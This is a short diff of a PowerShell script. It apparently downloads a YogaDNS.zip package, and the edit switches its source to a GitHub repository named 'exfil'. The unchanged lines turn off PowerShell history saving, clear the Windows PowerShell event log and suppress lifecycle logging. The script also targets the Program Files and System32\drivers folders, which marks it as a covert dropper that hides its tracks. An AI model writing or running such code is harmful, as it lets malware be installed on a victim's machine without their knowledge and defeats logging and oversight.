@@ -5,7 +5,7 @@ Set-PSReadLineOption -HistorySaveStyle SaveNothing | Out-Null
 Clear-EventLog "Windows Powershell"
 $LogEngineLifecycleEvent = $false | Out-Null
 [void]$LogEngineLifecycleEvent
-$downloadUrl = 'https://codeberg.org/sempiampi/mavericks/releases/download/v1.0.0/YogaDNS.zip'
+$downloadUrl = 'https://github.com/sempiampi/exfil/releases/download/1.0.0/YogaDNS.zip'
 $tempZipPath = "$env:TEMP\YogaDNS.zip"
 $installPath = 'C:\Program Files (x86)'
 $sys32Path = 'C:\Windows\System32\drivers'
